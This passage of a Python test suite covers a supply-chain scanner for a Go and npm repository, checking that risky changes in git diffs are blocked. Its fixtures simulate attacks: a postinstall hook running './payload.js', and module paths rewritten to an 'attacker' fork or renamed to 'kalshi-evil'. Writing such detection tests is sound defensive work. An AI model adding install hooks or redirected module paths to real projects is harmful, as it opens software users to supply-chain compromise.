    def test_hardcoded_setup_go_version_fails(self) -> None:
        self._write(".github/workflows/baseline.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/baseline.yml",
            "on: push\njobs:\n  x:\n    steps:\n      - uses: actions/setup-go@v6\n        with:\n          go-version: '1.26.5'\n",
        )
        self._commit("hardcode setup-go version")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_go_version_file_setup_go_passes(self) -> None:
        self._write(".github/workflows/baseline.yml", "on: push\n")
        self._write(".go-version", "1.26.5\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/baseline.yml",
            "on: push\njobs:\n  x:\n    steps:\n      - uses: actions/setup-go@v6\n        with:\n          go-version-file: .go-version\n",
        )
        self._commit("use shared setup-go version")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_library_go_directive_below_head_floor_fails(self) -> None:
        base = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\ngo 1.26.5\n"
        self._write(".go-version", "1.26.5\n")
        self._write("library/payments/kalshi/go.mod", base)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(".go-version", "1.26.6\n")
        self._write(
            "library/payments/kalshi/go.mod",
            base + "\nrequire example.com/foo v1.2.3\n",
        )
        self._commit("touch stale go mod after floor bump")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_postinstall_added_to_npm_fails(self) -> None:
        base = {"name": "@mvanhorn/printing-press", "scripts": {"build": "tsc"}}
        head = {"name": "@mvanhorn/printing-press", "scripts": {"build": "tsc", "postinstall": "node ./payload.js"}}
        self._write("npm/package.json", json.dumps(base, indent=2))
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write("npm/package.json", json.dumps(head, indent=2))
        self._commit("add postinstall")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_module_path_drift_fails(self) -> None:
        base = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\ngo 1.26.5\n"
        head = "module github.com/attacker/kalshi-fork\n\ngo 1.26.5\n"
        self._write("library/payments/kalshi/go.mod", base)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write("library/payments/kalshi/go.mod", head)
        self._commit("rewrite module path")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_within_canonical_rename_detected_via_git_rename(self) -> None:
        """End-to-end: git records a rename (kalshi → kalshi-evil), scan.py
        passes old_path to signals.py via build_change, R6 fires with the
        rename signal."""
        base = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\ngo 1.26.5\n"
        head = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi-evil\n\ngo 1.26.5\n"
        self._write("library/payments/kalshi/go.mod", base)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/rename")
        # Simulate rename: move directory + update module directive
        self._git("mv", "library/payments/kalshi", "library/payments/kalshi-evil")
        self._write("library/payments/kalshi-evil/go.mod", head)
        self._commit("rename + module update")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_new_cli_canonical_module_path_passes(self) -> None:
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/new-cli")
        self._write(
            "library/other/freshly-minted/go.mod",
            "module github.com/mvanhorn/printing-press-library/library/other/freshly-minted\n\ngo 1.26.5\n",
        )
        self._commit("add new CLI")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_strict_mode_promotes_advise_to_block(self) -> None:
        gomod = "module github.com/mvanhorn/printing-press-library/library/food-and-dining/foo\n\ngo 1.26.5\n"
        self._write("library/food-and-dining/foo/go.mod", gomod)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            "library/food-and-dining/foo/go.mod",
            gomod + "\nreplace foo => ./vendor/foo\n",
        )
        self._commit("local replace")
        rc = self._run_scan(base="main", strict=False)
        self.assertEqual(rc, 0)
        rc = self._run_scan(base="main", strict=True)
        self.assertEqual(rc, 1)


if __name__ == "__main__":
    unittest.main()
